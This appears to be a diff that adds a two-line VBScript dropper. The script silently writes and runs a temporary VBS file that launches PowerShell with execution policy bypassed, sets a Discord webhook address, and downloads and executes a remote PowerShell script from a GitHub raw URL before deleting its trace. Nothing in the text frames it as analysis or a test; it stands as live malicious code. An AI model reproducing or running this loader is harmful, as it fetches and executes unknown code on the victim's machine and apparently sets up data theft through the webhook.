@@ -1,0 +1,2 @@
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run "cmd /c echo Set objShell = CreateObject(""Wscript.Shell"") > tempScript.vbs && echo objShell.Run ""powershell -NoP -Ep Bypass -C $dc='https://discord.com/api/webhooks/1198613417100050563/iXRg3IGuporIJ81c9pxbaO5-sYLn4_OXHUEyBul87oT9EkfEks-dt8WzI7FKQJK5MCPc'; irm https://raw.githubusercontent.com/rakesh2684/log/main/7.ps1 | iex"", 0 >> tempScript.vbs && cscript //nologo tempScript.vbs && del tempScript.vbs  && timeout /t 10 && exit", 0, True
